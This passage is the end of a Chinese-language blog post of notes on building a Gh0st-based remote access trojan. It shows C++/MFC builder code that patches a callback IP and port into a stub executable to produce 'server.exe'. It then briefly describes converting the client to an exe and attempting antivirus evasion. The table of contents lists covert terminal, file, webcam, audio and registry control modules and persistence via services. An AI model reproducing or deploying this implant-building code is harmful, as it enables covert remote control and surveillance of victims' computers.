FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memfind</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* mem, <span class="keyword">const</span> <span class="keyword">char</span>* str, <span class="keyword">int</span> sizem, <span class="keyword">int</span> sizes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>   da, i, j;</span><br><span class="line">	<span class="keyword">if</span> (sizes == <span class="number">0</span>) da = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">else</span> da = sizes;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sizem; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; da; j++)</span><br><span class="line">			<span class="keyword">if</span> (mem[i + j] != str[j])	<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (j == da) <span class="keyword">return</span> i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CCreatServerDlg::OnBnClickedOk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	CFile file;</span><br><span class="line">	<span class="keyword">char</span> strTemp[MAX_PATH];</span><br><span class="line">	ZeroMemory(strTemp, MAX_PATH);</span><br><span class="line">	CString strCurrentPath;</span><br><span class="line">	CString strFile;</span><br><span class="line">	CString strSeverFile;</span><br><span class="line">	BYTE* lpBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwFileSize;</span><br><span class="line">	UpdateData(TRUE);</span><br><span class="line">	<span class="comment">//////////上线信息//////////////////////</span></span><br><span class="line">	<span class="built_in">strcpy</span>(g_myAddress.strIP,nIp);</span><br><span class="line">	g_myAddress.nPort = atoi(nPort);</span><br><span class="line">	<span class="keyword">try</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//此处得到未处理前的文件名</span></span><br><span class="line">		GetModuleFileName(<span class="literal">NULL</span>, strTemp, MAX_PATH);     <span class="comment">//得到文件名  </span></span><br><span class="line">		strCurrentPath = strTemp;</span><br><span class="line">		<span class="keyword">int</span> nPos = strCurrentPath.ReverseFind(<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">		strCurrentPath = strCurrentPath.Left(nPos);</span><br><span class="line">		strFile = strCurrentPath + <span class="string">&quot;\\server\\Loder.exe&quot;</span>;   <span class="comment">//得到当前未处理文件名</span></span><br><span class="line">		<span class="comment">//打开文件</span></span><br><span class="line">		file.Open(strFile, CFile::modeRead | CFile::typeBinary);</span><br><span class="line">		dwFileSize = file.GetLength();</span><br><span class="line">		lpBuffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">		ZeroMemory(lpBuffer, dwFileSize);</span><br><span class="line">		<span class="comment">//读取文件内容</span></span><br><span class="line">		file.Read(lpBuffer, dwFileSize);</span><br><span class="line">		file.Close();</span><br><span class="line">		<span class="comment">//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置</span></span><br><span class="line">		<span class="keyword">int</span> nOffset = memfind((<span class="keyword">char</span>*)lpBuffer, (<span class="keyword">char</span>*)&amp;g_myAddress.dwstact, dwFileSize, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">		<span class="built_in">memcpy</span>(lpBuffer + nOffset, &amp;g_myAddress, <span class="keyword">sizeof</span>(Connect_Address));</span><br><span class="line">		<span class="comment">//保存到文件</span></span><br><span class="line">		strSeverFile = strCurrentPath + <span class="string">&quot;\\server.exe&quot;</span>;</span><br><span class="line">		file.Open(strSeverFile, CFile::typeBinary | CFile::modeCreate | CFile::modeWrite);</span><br><span class="line">		file.Write(lpBuffer, dwFileSize);</span><br><span class="line">		file.Close();</span><br><span class="line">		<span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line">		MessageBox(<span class="string">&quot;生成成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (CMemoryException* e)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">&quot;内存不足&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (CFileException* e)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">&quot;文件操作错误&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (CException* e)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="string">&quot;未知错误&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	CDialogEx::OnOK();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="part16-我自己的客户端"><a href="#part16-我自己的客户端" class="headerlink" title="part16-我自己的客户端"></a>part16-我自己的客户端</h2><p>由于上面几种客户端实际上都不行，所以我自己将dll改成了exe，目的是exe方便执行，工程文件夹为AntiVirus。</p>
<h2 id="part17-免杀"><a href="#part17-免杀" class="headerlink" title="part17-免杀"></a>part17-免杀</h2><p>客户端改成exe后，我也尝试写了下免杀，试了几种方法，但是Ghost的特征太多，现在杀毒软件也比较完善了，没能成功。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">The_Itach1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/08/10/%E5%9F%BA%E4%BA%8EGh0st%E7%9A%84%E8%BF%9C%E6%8E%A7%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/">http://example.com/2022/08/10/%E5%9F%BA%E4%BA%8EGh0st%E7%9A%84%E8%BF%9C%E6%8E%A7%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/">编程开发</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/08/25/pwn%20heap%20learning/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">pwn heap learning</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/29/CVE-2018-18708%20TENDA%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://s2.loli.net/2022/07/29/ueB34kVHP8hsDiY.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CVE-2018-18708 TENDA缓冲区溢出漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/01/31/Windows-Hack-Programming/" title="Windows-Hack-Programming"><img class="cover" src="https://s2.loli.net/2022/01/31/ktMQEOe8CgB9LJD.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-31</div><div class="title">Windows-Hack-Programming</div></div></a></div><div><a href="/2021/10/19/Hook API/" title="Hook API"><img class="cover" src="https://i.loli.net/2021/10/19/zVLWyCboJvDKMQZ.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-19</div><div class="title">Hook API</div></div></a></div><div><a href="/2021/03/09/DLL注入技术/" title="DLL注入技术"><img class="cover" src="https://i.loli.net/2021/03/09/ureiVDLYMQqvnIf.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-09</div><div class="title">DLL注入技术</div></div></a></div><div><a href="/2022/01/11/windows反调试总结/" title="Windows反调试总结"><img class="cover" src="https://s2.loli.net/2022/01/11/RcyES7Ve6Fmk9Dw.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-11</div><div class="title">Windows反调试总结</div></div></a></div><div><a href="/2021/03/30/win32编程学习笔记/" title="win32编程学习笔记"><img class="cover" src="https://i.loli.net/2021/03/30/n7siDC4uFlg8SLv.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-30</div><div class="title">win32编程学习笔记</div></div></a></div><div><a href="/2022/12/23/StealthHook/" title="StealthHook"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-23</div><div class="title">StealthHook</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/5.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">The_Itach1</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EGh0st%E7%9A%84%E8%BF%9C%E6%8E%A7%E9%A1%B9%E7%9B%AE%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">基于Gh0st的远控项目笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#part1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">part1-环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VS%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">VS环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAMFC%E5%AF%B9%E8%AF%9D%E6%A1%86%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">创建MFC对话框程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part2-%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%95%8C%E9%9D%A2%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E7%BC%96%E5%86%99"><span class="toc-number">1.2.</span> <span class="toc-text">part2-客户端界面的设计和编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E4%B8%A4%E4%B8%AAList-Control"><span class="toc-number">1.2.1.</span> <span class="toc-text">添加两个List Control</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%88%97%E8%A1%A8%E6%B7%BB%E5%8A%A0%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">给列表添加变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A9%E5%88%97%E8%A1%A8%E7%9A%84%E5%88%97%E8%83%BD%E9%9A%8F%E7%AA%97%E5%8F%A3%E7%9A%84%E5%8F%98%E5%8C%96%E8%80%8C%E5%8F%98%E5%8C%96"><span class="toc-number">1.2.3.</span> <span class="toc-text">让列表的列能随窗口的变化而变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%A1%8C%E4%BF%A1%E6%81%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text">添加行信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99Online%E5%88%97%E8%A1%A8%E6%B7%BB%E5%8A%A0%E8%8F%9C%E5%8D%95%E6%A0%8F"><span class="toc-number">1.2.5.</span> <span class="toc-text">给Online列表添加菜单栏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E8%8F%9C%E5%8D%95%E9%80%89%E9%A1%B9%E6%B7%BB%E5%8A%A0%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.6.</span> <span class="toc-text">为菜单选项添加处理函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E4%B8%BB%E5%AF%B9%E8%AF%9D%E6%A1%86%E8%8F%9C%E5%8D%95%E5%92%8C%E9%83%A8%E5%88%86%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">添加主对话框菜单和部分处理函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%8A%B6%E6%80%81%E6%A0%8F"><span class="toc-number">1.2.8.</span> <span class="toc-text">添加状态栏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%8A%9F%E8%83%BD%E5%9B%BE%E6%A0%87"><span class="toc-number">1.2.9.</span> <span class="toc-text">添加功能图标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E7%B3%BB%E7%BB%9F%E6%89%98%E7%9B%98"><span class="toc-number">1.2.10.</span> <span class="toc-text">添加系统托盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AA%E6%80%A7%E5%8C%96%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.2.11.</span> <span class="toc-text">个性化设置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part3-Socket%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%86%85%E6%A0%B8"><span class="toc-number">1.3.</span> <span class="toc-text">part3-Socket服务端数据传输内核</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%A5%97%E7%94%A8%E5%85%B6%E7%9B%B8%E5%85%B3%E7%9A%84%E7%B1%BB"><span class="toc-number">1.3.1.</span> <span class="toc-text">直接套用其相关的类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gh0st%E7%9A%84Socket%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">Gh0st的Socket数据传输代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8G0hst%E7%9A%84%E4%BB%A3%E7%A0%81%E7%BB%91%E5%AE%9A%E5%B9%B6%E7%9B%91%E5%90%AC%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用G0hst的代码绑定并监听指定端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.4.</span> <span class="toc-text">添加ini配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part4-socket%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">part4-socket客户端的数据传输过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%97%E7%94%A8Gh0st%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91dll%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text">套用Gh0st源码编译dll文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%A0%B7%E7%90%86%E8%A7%A3Gh0st%E7%9A%84socket%E5%86%85%E6%A0%B8"><span class="toc-number">1.4.2.</span> <span class="toc-text">同样理解Gh0st的socket内核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0%E4%BD%9C%E4%B8%BAClient%E7%9A%84%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.3.</span> <span class="toc-text">添加一个导出函数作为Client的连接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AAexe%E4%BD%BF%E7%94%A8dll%E6%96%87%E4%BB%B6%E7%9A%84%E5%AF%BC%E5%87%BA%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.4.</span> <span class="toc-text">编写一个exe使用dll文件的导出函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B7%BB%E5%8A%A0%E4%B8%8A%E7%BA%BF%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.5.</span> <span class="toc-text">服务端添加上线信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part5-%E7%BB%88%E7%AB%AF%E7%AE%A1%E7%90%86"><span class="toc-number">1.5.</span> <span class="toc-text">part5-终端管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">客户端代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.2.</span> <span class="toc-text">控制服务端代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B"><span class="toc-number">1.5.3.</span> <span class="toc-text">传输过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B2%BE%E5%BD%A9%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.4.</span> <span class="toc-text">精彩代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part6-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="toc-number">1.6.</span> <span class="toc-text">part6-进程管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.1.</span> <span class="toc-text">进程监控原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AFCProcessManager-cpp"><span class="toc-number">1.6.2.</span> <span class="toc-text">客户端CProcessManager.cpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E7%AB%AFCProcessDlg-cpp"><span class="toc-number">1.6.3.</span> <span class="toc-text">控制服务端CProcessDlg.cpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B"><span class="toc-number">1.6.4.</span> <span class="toc-text">数据传输过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part7-%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text">part7-窗口管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%8E%9F%E7%90%86"><span class="toc-number">1.7.1.</span> <span class="toc-text">窗口管理原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%9C%8D%E5%8A%A1%E7%AB%AFCWindowsDlg-cpp"><span class="toc-number">1.7.2.</span> <span class="toc-text">控制服务端CWindowsDlg.cpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AFCWindowsManager-cpp"><span class="toc-number">1.7.3.</span> <span class="toc-text">客户端CWindowsManager.cpp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93"><span class="toc-number">1.7.4.</span> <span class="toc-text">数据传输</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part8-%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86"><span class="toc-number">1.8.</span> <span class="toc-text">part8-文件管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part9-%E9%9F%B3%E9%A2%91%E7%AE%A1%E7%90%86"><span class="toc-number">1.9.</span> <span class="toc-text">part9-音频管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part10-%E6%91%84%E5%83%8F%E5%A4%B4%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86"><span class="toc-number">1.10.</span> <span class="toc-text">part10-摄像头视频管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part11-%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86"><span class="toc-number">1.11.</span> <span class="toc-text">part11-服务管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part12-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%AE%A1%E7%90%86"><span class="toc-number">1.12.</span> <span class="toc-text">part12-注册表管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part13-%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E5%90%AF%E5%8A%A8%E7%AE%A1%E7%90%86"><span class="toc-number">1.13.</span> <span class="toc-text">part13-客户端的启动管理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.13.1.</span> <span class="toc-text">资源加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.13.2.</span> <span class="toc-text">添加服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9DLL%EF%BC%8C%E6%B5%8B%E8%AF%95%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.13.3.</span> <span class="toc-text">修改DLL，测试上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part14-ActiveX%E5%90%AF%E5%8A%A8"><span class="toc-number">1.14.</span> <span class="toc-text">part14-ActiveX启动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">1.14.1.</span> <span class="toc-text">实现原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%E4%B8%80"><span class="toc-number">1.14.2.</span> <span class="toc-text">解决问题一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%E4%BA%8C"><span class="toc-number">1.14.3.</span> <span class="toc-text">解决问题二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98%E4%B8%89"><span class="toc-number">1.14.4.</span> <span class="toc-text">解决问题三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part15-%E7%94%9F%E6%88%90%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.15.</span> <span class="toc-text">part15-生成客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part16-%E6%88%91%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.16.</span> <span class="toc-text">part16-我自己的客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part17-%E5%85%8D%E6%9D%80"><span class="toc-number">1.17.</span> <span class="toc-text">part17-免杀</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/23/StealthHook/" title="StealthHook"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="StealthHook"/></a><div class="content"><a class="title" href="/2022/12/23/StealthHook/" title="StealthHook">StealthHook</a><time datetime="2022-12-23T09:38:45.000Z" title="Created 2022-12-23 17:38:45">2022-12-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/16/DirectX%20Hook/" title="DirectX Hook and CsgoHacker"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DirectX Hook and CsgoHacker"/></a><div class="content"><a class="title" href="/2022/12/16/DirectX%20Hook/" title="DirectX Hook and CsgoHacker">DirectX Hook and CsgoHacker</a><time datetime="2022-12-16T09:38:45.000Z" title="Created 2022-12-16 17:38:45">2022-12-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/12/Tenda%20Ax12%E8%AE%BE%E5%A4%87%E5%88%86%E6%9E%90/" title="Tenda Ax12设备分析"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tenda Ax12设备分析"/></a><div class="content"><a class="title" href="/2022/11/12/Tenda%20Ax12%E8%AE%BE%E5%A4%87%E5%88%86%E6%9E%90/" title="Tenda Ax12设备分析">Tenda Ax12设备分析</a><time datetime="2022-11-12T09:38:45.000Z" title="Created 2022-11-12 17:38:45">2022-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/12/TOTOLINK%20NR1800X%E7%B3%BB%E5%88%97CVE%E5%88%86%E6%9E%90/" title="TOTOLINK NR1800X系列CVE分析"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TOTOLINK NR1800X系列CVE分析"/></a><div class="content"><a class="title" href="/2022/10/12/TOTOLINK%20NR1800X%E7%B3%BB%E5%88%97CVE%E5%88%86%E6%9E%90/" title="TOTOLINK NR1800X系列CVE分析">TOTOLINK NR1800X系列CVE分析</a><time datetime="2022-10-12T09:38:45.000Z" title="Created 2022-10-12 17:38:45">2022-10-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/05/CVE-2022-34598%20H3C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2022-34598 H3C命令执行漏洞"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2022-34598 H3C命令执行漏洞"/></a><div class="content"><a class="title" href="/2022/09/05/CVE-2022-34598%20H3C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2022-34598 H3C命令执行漏洞">CVE-2022-34598 H3C命令执行漏洞</a><time datetime="2022-09-05T09:38:45.000Z" title="Created 2022-09-05 17:38:45">2022-09-05</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By The_Itach1</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" 